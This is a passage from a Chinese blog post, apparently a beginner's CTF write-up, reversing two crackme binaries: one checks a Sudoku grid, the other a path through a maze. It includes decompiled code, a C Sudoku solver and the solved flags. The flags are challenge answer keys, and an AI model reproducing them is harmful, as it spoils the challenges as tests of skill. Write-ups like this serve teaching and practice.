class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_4009C9(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; // [rsp+1Ch] [rbp-34h]</span><br><span class="line">  int j; // [rsp+20h] [rbp-30h]</span><br><span class="line">  signed int l; // [rsp+20h] [rbp-30h]</span><br><span class="line">  int k; // [rsp+24h] [rbp-2Ch]</span><br><span class="line">  signed int v6; // [rsp+28h] [rbp-28h]</span><br><span class="line">  signed int v7; // [rsp+2Ch] [rbp-24h]</span><br><span class="line">  char s[24]; // [rsp+30h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v9; // [rsp+48h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(0x28u);</span><br><span class="line">  v6 = 3;</span><br><span class="line">  v7 = 3;</span><br><span class="line">  for ( i = 0; i &lt;= 8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(s, 0, 0xAuLL);</span><br><span class="line">    for ( j = v6 - 3; j &lt; v6; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      for ( k = v7 - 3; k &lt; v7; ++k )</span><br><span class="line">        ++s[*(unsigned __int8 *)(9 * j + k + a1)];</span><br><span class="line">    &#125;</span><br><span class="line">    for ( l = 1; l &lt;= 9; ++l )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( s[l] != 1 )</span><br><span class="line">        sub_4006F6();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v7 == 9 )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = 3;</span><br><span class="line">      v6 += 3;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      v7 += 3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要看仔细了，for循环套for循环（我看了好久才看懂/尴尬！）<br>联系前面分析过的的函数，这题的意思就是个数独题（早知道就先搜下singe题目的意思了），9<em>9的宫格，每行每列，和分看成9个3</em>3的宫格必须由1-9组成。</p><p>所以我们的解题思路就有了，将word_602080（即a2参数）处的字串（当然我们支取前 81位数据）将他们排成9*9格式，由爱玩数独的话可以将他们直接接出来就好，我们把完善好的数独称为完成的完整数独（81），然后将原81位数据的不为0的数对应的位置 将完整数独对应位置 等于 0这样，在经修改的完整数独就是我们要输入的81位字符了<br>所以：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;401095728057800001802040305000321589500479002923586000105060203300008950269750804&#125;</span><br></pre></td></tr></table></figure><p>当然，对我们们来说我们用代码来帮我们填写C语言实现：</p><p>嗯嗯，越来越感到编程的重要性了，编程也要修炼了，有强度的训练了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">// 寻找下一个未填充的单元</span><br><span class="line">int find_next_empty(int arr[9][9], int startrow, int *row, int *col)</span><br><span class="line">&#123;</span><br><span class="line">int i, j;</span><br><span class="line"></span><br><span class="line">for (i = startrow; i &lt; 9; i++) </span><br><span class="line">for (j = 0; j &lt; 9; j++) </span><br><span class="line">if (arr[i][j] == 0) &#123;</span><br><span class="line">*row = i;</span><br><span class="line">*col = j;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void print(int a[9][9])</span><br><span class="line">&#123;</span><br><span class="line">int i, j;</span><br><span class="line"></span><br><span class="line">for (i = 0; i &lt; 9; i++) &#123;</span><br><span class="line">for (j = 0; j &lt; 9; j++) &#123;</span><br><span class="line">printf(&quot;%2d&quot;, a[i][j]);</span><br><span class="line">if (j == 8) printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int do_resolve(int arr[9][9], int row, int col)</span><br><span class="line">&#123;</span><br><span class="line">int i, j, n;</span><br><span class="line"></span><br><span class="line">int next_row, next_col;</span><br><span class="line"></span><br><span class="line">n = 0;</span><br><span class="line">while(1) &#123;</span><br><span class="line">next_num:</span><br><span class="line">++n;</span><br><span class="line">if (n &gt;= 10) break;</span><br><span class="line"></span><br><span class="line">// 判断行重复</span><br><span class="line">for (j = 0; j &lt; 9; j++) &#123;</span><br><span class="line">if (arr[row][j] == n) &#123;</span><br><span class="line">goto next_num;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 判断列重复</span><br><span class="line">for (i = 0; i &lt; 9; i++) &#123;</span><br><span class="line">if (arr[i][col] == n) &#123;</span><br><span class="line">goto next_num;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 判断所在小九宫格重复*/</span><br><span class="line">int x = (row / 3) * 3;</span><br><span class="line">int y = (col / 3) * 3;</span><br><span class="line">for (i = x; i &lt; x + 3; i++) &#123;</span><br><span class="line">for (j = y; j &lt; y + 3; j++)&#123;</span><br><span class="line">if (arr[i][j] == n) &#123;</span><br><span class="line">goto next_num;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//该单元可以填充</span><br><span class="line">arr[row][col] = n;</span><br><span class="line">//如果9宫格已填满，完成，这里不考虑有多解的情况</span><br><span class="line">if (!find_next_empty(arr, row, &amp;next_row, &amp;next_col)) &#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line">//否则继续填下一个未填充的格子</span><br><span class="line">if (!do_resolve(arr, next_row, next_col)) &#123;</span><br><span class="line">arr[row][col] = 0;</span><br><span class="line">continue;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void resolve_sudoku(int a[9][9])</span><br><span class="line">&#123;</span><br><span class="line">int row, col;</span><br><span class="line"></span><br><span class="line">find_next_empty(a, 0, &amp;row, &amp;col);</span><br><span class="line">do_resolve(a, row, col);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int a[9][9] = &#123;</span><br><span class="line">0,   3,   0,   6,   0,   0,   0,   0,   0,   6, </span><br><span class="line">    0,   0,   0,   3,   2,   4,   9,   0,   0,   9, </span><br><span class="line">    0,   1,   0,   7,   0,   6,   0,   7,   4,   6, </span><br><span class="line">    0,   0,   0,   0,   0,   0,   0,   1,   8,   0, </span><br><span class="line">    0,   0,   6,   3,   0,   0,   0,   0,   0,   0, </span><br><span class="line">    0,   1,   4,   7,   0,   8,   0,   9,   0,   4, </span><br><span class="line">    0,   7,   0,   0,   7,   4,   2,   1,   0,   0, </span><br><span class="line">    0,   6,   0,   0,   0,   0,   0,   3,   0,   1, </span><br><span class="line">    0</span><br><span class="line">//8,0,0,0,0,0,0,0,0,</span><br><span class="line">//0,0,3,6,0,0,0,0,0,</span><br><span class="line">//0,7,0,0,9,0,2,0,0,</span><br><span class="line">//0,5,0,0,0,7,0,0,0,</span><br><span class="line">//0,0,0,0,4,5,7,0,0,</span><br><span class="line">//0,0,0,1,0,0,0,3,0,</span><br><span class="line">//0,0,1,0,0,0,0,6,8,</span><br><span class="line">//0,0,8,5,0,0,0,1,0,</span><br><span class="line">//0,9,0,0,0,0,4,0,0</span><br><span class="line">&#125;;</span><br><span class="line">resolve_sudoku(a);</span><br><span class="line">print(a);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">//参考：</span><br><span class="line">//https://blog.csdn.net/qiuhui00/article/details/4207691577</span><br><span class="line"></span><br><span class="line">//https://bbs.pediy.com/thread-249523.htm</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">运行结果：</span><br><span class="line">4 3 1 6 9 5 7 2 8</span><br><span class="line"> 6 5 7 8 3 2 4 9 1</span><br><span class="line"> 8 9 2 1 4 7 3 6 5</span><br><span class="line"> 7 4 6 3 2 1 5 8 9</span><br><span class="line"> 5 1 8 4 7 9 6 3 2</span><br><span class="line"> 9 2 3 5 8 6 1 4 7</span><br><span class="line"> 1 8 5 9 6 4 2 7 3</span><br><span class="line"> 3 7 4 2 1 8 9 5 6</span><br><span class="line"> 2 6 9 7 5 3 8 1 4</span><br></pre></td></tr></table></figure><h2 id="MAZE"><a href="#MAZE" class="headerlink" title="MAZE"></a>MAZE</h2><p>我好菜啊！<br>拖入ida F12 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">LOAD:00000000004002380000001CC/lib64/ld-linux-x86-64.so.2</span><br><span class="line">LOAD:00000000004003790000000AClibc.so.6</span><br><span class="line">LOAD:000000000040038300000005Cexit</span><br><span class="line">LOAD:000000000040038800000008Cstrncmp</span><br><span class="line">LOAD:000000000040039000000005Cputs</span><br><span class="line">LOAD:000000000040039500000007Cstrlen</span><br><span class="line">LOAD:000000000040039C00000006Cscanf</span><br><span class="line">LOAD:00000000004003A200000012C__libc_start_main</span><br><span class="line">LOAD:00000000004003B40000000FC__gmon_start__</span><br><span class="line">LOAD:00000000004003C30000000CCGLIBC_2.2.5</span><br><span class="line">.rodata:00000000004008C40000000CCInput flag:</span><br><span class="line">.rodata:00000000004008D30000000CCWrong flag!</span><br><span class="line">.rodata:00000000004008DF00000006Cnctf&#123;</span><br><span class="line">.rodata:00000000004008E500000011CCongratulations!</span><br><span class="line">.eh_frame:00000000004009BF00000006C;*3$\&quot;</span><br><span class="line">.data:000000000060106000000041C  *******   *  **** * ****  * ***  *#  *** *** ***     *********</span><br></pre></td></tr></table></figure><p>看到最下面的字符串，猜测是迷宫题双击它，然后 X 到达使用它的位置 然后 F5大法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 v3; // rbx</span><br><span class="line">  signed int v4; // eax</span><br><span class="line">  bool v5; // bp</span><br><span class="line">  bool v6; // al</span><br><span class="line">  const char *v7; // rdi</span><br><span class="line">  __int64 v9; // [rsp+0h] [rbp-28h]</span><br><span class="line"></span><br><span class="line">  v9 = 0LL;</span><br><span class="line">  puts(&quot;Input flag:&quot;);</span><br><span class="line">  scanf(&quot;%s&quot;, &amp;s1, 0LL);                        // 输入字符串放在s1指针处</span><br><span class="line">  if ( strlen(&amp;s1) != 24 || strncmp(&amp;s1, &quot;nctf&#123;&quot;, 5uLL) || *(&amp;byte_6010BF + 24) != &apos;&#125;&apos; )</span><br><span class="line">  &#123;                                             // 输入字符串长度  =24  前5个字符 等于nctf&#123; 24个为 &#125;</span><br><span class="line">LABEL_22:</span><br><span class="line">    puts(&quot;Wrong flag!&quot;);                        // LABEL_22为报错，并退出程序</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = 5LL;                                     // v4=5     作用是 寻址</span><br><span class="line">  if ( strlen(&amp;s1) - 1 &gt; 5 )                    // 循环 24-1 -5=18 次</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = *(&amp;s1 + v3);                         // v5=s1[5]</span><br><span class="line">      v5 = 0;                                   // v6=0</span><br><span class="line">      if ( v4 &gt; 78 )                            // /if   分支</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (unsigned __int8)v4;               // unsigned__int 就是 如果二进制高位是1 它则是个大数而不是负数</span><br><span class="line">        if ( (unsigned __int8)v4 == 79 )        // 79 为ASCII 的大写 O</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = sub_400650((_DWORD *)&amp;v9 + 1);   // v7=&amp;v10[1] --    向左</span><br><span class="line">          goto LABEL_14;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v4 == 111 )</span><br><span class="line">        &#123;                                       // o</span><br><span class="line">          v6 = sub_400660((int *)&amp;v9 + 1);      // 向右 </span><br><span class="line">          goto LABEL_14;                        // 8列</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (unsigned __int8)v4;</span><br><span class="line">        if ( (unsigned __int8)v4 == 46 )        // .</span><br><span class="line">        &#123;                                       // 向上</span><br><span class="line">          v6 = sub_400670(&amp;v9);</span><br><span class="line">          goto LABEL_14;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( v4 == 48 )                         // 数字 0</span><br><span class="line">        &#123;                                       // 向下</span><br><span class="line">          v6 = sub_400680((int *)&amp;v9);          // 8行</span><br><span class="line">LABEL_14:</span><br><span class="line">          v5 = v6;                              // v6=v7</span><br><span class="line">          goto LABEL_15;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">      if ( !(unsigned __int8)sub_400690((__int64)asc_601060, SHIDWORD(v9), v9) )</span><br><span class="line">        goto LABEL_22;</span><br><span class="line">      if ( ++v3 &gt;= strlen(&amp;s1) - 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v5 )</span><br><span class="line">          break;</span><br><span class="line">LABEL_20:</span><br><span class="line">        v7 = &quot;Wrong flag!&quot;;</span><br><span class="line">        goto LABEL_21;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( asc_601060[8 * (signed int)v9 + SHIDWORD(v9)] != 35 )// 终点  是 #</span><br><span class="line">    goto LABEL_20;</span><br><span class="line">  v7 = &quot;Congratulations!&quot;;</span><br><span class="line">LABEL_21:</span><br><span class="line">  puts(v7);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br><span class="line">/* Orphan comments:</span><br><span class="line">HIDWORD(v10)的意思是取v10的下字节的宏</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>这里有个需要注意就是SHIDWORD宏<br>SHIDWORD是取下一个字节<br>，由601060+8 v9+SHIDWORD(v9)可以猜出，v9为行数，每行8个字符。<br>也就是那一段应该是判断地图位置，判断迷宫是8 8的<br>参考链接：<a href="https://blog.csdn.net/huiguixian/article/details/52026710" target="_blank" rel="noopener">https://blog.csdn.net/huiguixian/article/details/52026710</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define SHIDWORD(x)  (*((int32*)&amp;(x)+1))</span><br><span class="line">//即</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0000000000601060  20 20 2A 2A  2A 2A 2A 2A    ******</span><br><span class="line">0000000000601068  2A 20 20 20  2A 20 20 2A  *   *  *</span><br><span class="line">0000000000601070  2A 2A 2A 20  2A 20 2A 2A  *** * **</span><br><span class="line">0000000000601078  2A 2A 20 20  2A 20 2A 2A  **  * **</span><br><span class="line">0000000000601080  2A 20 20 2A  23 20 20 2A  *  *#  *</span><br><span class="line">0000000000601088  2A 2A 20 2A  2A 2A 20 2A  ** *** *</span><br><span class="line">0000000000601090  2A 2A 20 20  20 20 20 2A  **     *</span><br><span class="line">0000000000601098  2A 2A 2A 2A  2A 2A 2A 2A  ********</span><br></pre></td></tr></table></figure><p>我们从20 走到23<br>路线：右下下右右下下左下下下右右右右上上左左<br>o00o00O000oooo..OO</p><p>加上nctf{}<br>所以flag：<br>nctf{o00o00O000oooo..OO}</p><h2 id="近期计划："><a href="#近期计划：" class="headerlink" title="近期计划："></a>近期计划：</h2><ol><li>idc python’脚本的使用</li><li>编程集中练习</li><li>C++文件操作再学习</li><li>哔哩哔哩 没事了看看 python</li></ol><p><a href="https://imgchr.com/i/n2zE5j" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/15/n2zE5j.gif" alt="n2zE5j.gif"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;虽然在过程中学到了很多，不过总是觉得好慢，还要学的东西太多了，不能细算！慢慢学，就总会好的！下面记录了CF CTF的single和maze 两道逆向题！&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="http://yoursite.com/tags/re/"/>
    
  </entry>
  
</feed>
